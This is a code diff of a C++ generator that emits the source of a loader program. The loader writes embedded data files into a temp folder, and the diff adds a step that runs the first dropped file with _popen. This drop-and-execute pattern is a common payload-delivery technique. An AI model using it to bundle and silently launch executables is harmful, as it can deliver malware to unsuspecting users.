@@ -6,8 +6,10 @@ Loader::Loader() noexcept
 	runPath("C:\\temp"),
 	outputBuffer("")
 {
+	// Loader code sections
 	loader_impl_0 = {
-	"#pragma once\n"
+	"#include <string>\n"
+	"#include <vector>\n"
 	"#include <filesystem>\n"
 	"#include <fstream>\n"
 	"#include \"data.h\"\n"
@@ -16,20 +18,22 @@ Loader::Loader() noexcept
 	"{\n"
 		"\tstd::string path;\n"
 		"\tstd::vector<std::string> fileNames;\n"
-		"\tstd::vector<char*> data;\n"
+		"\tstd::vector<unsigned char*> data;\n"
 		"\tstd::vector<uint64_t> sizes;\n"
 		"\tstd::ofstream outFile;\n"
 		"\n"
 	};
 
 	loader_impl_1 = {
-			"\tfor (int i = 0; i < data.size(); ++i)\n"
+			"\tfor (unsigned int i = 0; i < data.size(); ++i)\n"
 			"\t{\n"
 				"\t\toutFile.open(path + \"\\\\\" + fileNames[i], std::ios::out | std::ios::binary);\n"
-				"\t\toutFile.write(data[i], sizes[i]);\n"
+				"\t\toutFile.write(reinterpret_cast<const char*>(data[i]), sizes[i]);\n"
 				"\t\toutFile.close();\n"
 			"\t}\n"
 			"\n"
+			"\tpath.append(\"\\\\\" + fileNames[0]);\n"
+			"\t_popen(path.c_str(), \"r\");\n"
 			"\treturn 0;\n"
 		"}\n"
 	};
